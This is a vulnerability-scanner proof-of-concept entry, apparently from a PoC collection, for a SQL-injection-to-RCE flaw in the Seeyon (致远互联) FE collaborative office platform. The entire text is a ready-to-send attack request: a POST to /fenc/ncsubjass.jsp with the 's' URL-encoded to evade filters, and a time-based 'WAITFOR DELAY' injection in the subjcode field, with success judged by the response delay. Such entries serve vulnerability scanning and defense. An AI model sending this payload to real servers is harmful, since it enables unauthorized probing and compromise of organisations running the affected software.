{
        'name': '致远互联FE协作办公平台 ncsubjass SQL注入致RCE漏洞',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/fenc/ncsubjass.j%73p',
            'headers': {
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            'data': """subjcode=';WAITFOR DELAY '0:0:5'--""",
            'dnslog': False,
            'sqltime': True,
        },
        'response': {
            'status_code': False,
            'text': False
        }}]
    }